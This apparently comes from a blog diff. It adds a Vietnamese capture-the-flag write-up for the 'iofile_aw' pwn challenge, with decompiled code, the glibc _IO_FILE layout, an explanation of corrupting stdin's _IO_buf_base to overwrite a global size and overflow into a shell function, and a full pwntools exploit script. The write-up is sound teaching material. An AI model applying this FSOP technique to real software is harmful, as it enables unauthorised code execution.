@@ -2149,3 +2149,210 @@ p.interactive()
 - như ta đã nói ta cần control io_buf_end và buf_base làm đối số  , và setup _IO_write_base là 0 và _IO_write_ptr  để bypass đoạn check , ta cũng cần setup _lock thành địa chỉ có thể ghi
 
 ![here](/assets/images/fsop1.png)
+
+## iofile_aw
+
+- main : ta sẽ có 4 option ở bài này 
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char s[520]; // [rsp+10h] [rbp-220h] BYREF
+  void *src; // [rsp+218h] [rbp-18h]
+  void *dest; // [rsp+220h] [rbp-10h]
+  int v7; // [rsp+22Ch] [rbp-4h]
+
+  v7 = 0;
+  dest = 0LL;
+  src = 0LL;
+  memset(s, 0, 0x1FFuLL);
+  initialize(s);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          printf("# ");
+          read_command(s);
+          if ( strcmp(s, "read") )
+            break;
+          read_str(s);
+        }
+        if ( strcmp(s, "help") )
+          break;
+        help(s);
+      }
+      if ( strncmp(s, "printf", 6uLL) )
+        break;
+      if ( strtok(s, " ") )
+      {
+        src = strtok(0LL, " ");
+        dest = stdin;
+        if ( src )
+          memcpy(dest, src, 0x40uLL);
+      }
+    }
+    if ( !strcmp(s, "exit") )
+      break;
+    printf("%s: command not found\n", s);
+  }
+  return 0;
+}
+```
+
+- read_str: input vào ```buf``` (79-1) bytes , 
+
+```c
+char *read_str()
+{
+  return fgets(buf, 79, stdin);
+}
+```
+
+- heap:  chỉ đơn giản là in 1 chuỗi ra 
+
+```c
+int help()
+{
+  return puts("read: Read a line from the standard input and split it into fields.");
+}
+```
+
+- read_command : ta thấy nó read vào ```a1``` , và ```a1``` là 1 biến ở main với size là 0x200
+
+```cs
+unsigned __int8 *__fastcall read_command(unsigned __int8 *a1)
+{
+  unsigned __int8 *result; // rax
+  int v2; // [rsp+1Ch] [rbp-4h]
+
+  v2 = read(0, a1, size);
+  result = (unsigned __int8 *)a1[v2 - 1];
+  if ( (_BYTE)result == 10 )
+  {
+    result = &a1[v2 - 1];
+    *result = 0;
+  }
+  return result;
+}
+```
+
+- printf: option này dùng strtok để tách chuỗi , nếu ```src``` không NULL thì nó sẽ sao chép dữ liệu từ ```src``` vào ```dest``` và dest là ```stdin``` của ta .. 
+
+
+```c
+if ( strncmp(s, "printf", 6uLL) )
+        break;
+      if ( strtok(s, " ") )
+      {
+        src = strtok(0LL, " ");
+        dest = stdin;
+        if ( src )
+          memcpy(dest, src, 0x40uLL);
+      }
+    }
+    if ( !strcmp(s, "exit") )
+      break;
+    printf("%s: command not found\n", s);
+  }
+```
+
+
+- vì vậy ta có thể ghi vào ```stdin``` ở bài này , tuy nhiên 0x40 có lẽ là không đủ ghi đè vtable  
+
+```c
+0x0    _flags
+ 0x8    _IO_read_ptr
+ 0x10   _IO_read_end
+ 0x18   _IO_read_base
+ 0x20   _IO_write_base
+ 0x28   _IO_write_ptr
+ 0x30   _IO_write_end
+ 0x38   _IO_buf_base      // <---- giới hạn khả năng tiếp cận 
+0x40   _IO_buf_end
+ 0x48   _IO_save_base
+ 0x50   _IO_backup_base
+ 0x58   _IO_save_end
+ 0x60   _markers
+ 0x68   _chain
+ 0x70   _fileno
+ 0x74   _flags2
+ 0x78   _old_offset
+ 0x80   _cur_column
+ 0x82   _vtable_offset
+ 0x83   _shortbuf
+ 0x88   _lock
+ 0x90   _offset
+ 0x98   _codecvt
+ 0xa0   _wide_data
+ 0xa8   _freeres_list
+ 0xb0   _freeres_buf
+ 0xb8   __pad5
+ 0xc0   _mode
+ 0xc4   _unused2
+ 0xd8   vtable
+```
+
+- ở đây ta còn 1 hàm khác là hàm ```get_shell``` , tuy nhiên thì ta không có bất cứ ```bof``` nào???  làm sao để ret2win?
+
+```c
+int get_shell()
+{
+  return system("/bin/sh");
+}
+```
+
+- ở đây ta có thể overwrite dữ liệu của ```stdin``` , và size ở ```read_command``` nằm trong bss , ý tưởng là ta sẽ thay đổi dữ liệu của ```size``` 
+- _IO_buf_base là nơi địa chỉ bộ nhớ của mục tiêu của một hoạt động I/O được ghi khi thực hiện một hoạt động I/O. Nếu bạn thao tác giá trị này, bạn có thể ghi các địa chỉ tùy ý vào các tệp hoặc biến tùy ý khác (giả sử bạn biết địa chỉ). Điều gì sẽ xảy ra nếu chúng ta tùy ý ghi vào biến có tên là size, được khai báo là biến toàn cục, và tăng giá trị của nó?
+
+```cs
+int size = 512;
+```
+
+- vậy đơn giản là ta sẽ change size trong hàm read_command rồi ret2win
+
+exp: 
+
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./iofile_aw_patched")
+libc = ELF("./libc-2.23.so")
+ld = ELF("./ld-2.23.so")
+
+context.binary = exe
+
+p = process()
+
+size = 0x602010
+system = exe.sym.get_shell
+
+pay = p64(0xfbad208b) #flag
+pay += p64(0) #read ptr
+pay += p64(0) #read end
+pay += p64(0) #read base
+pay += p64(0) #write base
+pay += p64(0) #write ptr
+pay += p64(0) #write end
+pay += p64(size) #buf base
+
+input()
+p.sendafter(b'# ',b'printf ' + pay)
+payload2 = 0x1000
+
+input()
+p.sendlineafter(b'# ',b'read\x00')
+p.sendline(p64(0x1000))
+
+pl3 = b'exit\x00'
+pl3 += b'a'*0x223 + p64(system)
+p.sendafter(b'# ',pl3)
+
+p.interactive()
+```
